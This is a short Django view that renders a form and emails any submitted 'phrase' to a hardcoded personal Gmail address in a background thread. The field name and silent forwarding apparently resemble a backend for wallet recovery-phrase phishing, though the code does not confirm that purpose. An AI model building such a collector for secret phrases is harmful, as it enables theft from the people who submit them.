import threading
from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings

def send_email_async(subject, message, recipient_list):
    """Function to send email in a separate thread."""
    thread = threading.Thread(
        target=send_mail,
        args=(subject, message, settings.DEFAULT_FROM_EMAIL, recipient_list),
        kwargs={'fail_silently': False}
    )
    thread.start()  # Run the email sending process in a new thread

def index(request):
    if request.method == 'POST':
        phrase_text = request.POST.get('phrase')
        if phrase_text:  # Ensure input is not empty
            # Send email asynchronously
            send_email_async(
                subject="New Phrase Submission",
                message=f"A new phrase was submitted:\n\n{phrase_text}",
                recipient_list=['ekipsang200@gmail.com']
            )

        return redirect('success')  # Redirect after submission

    return render(request, 'index.html')  # Render the form page
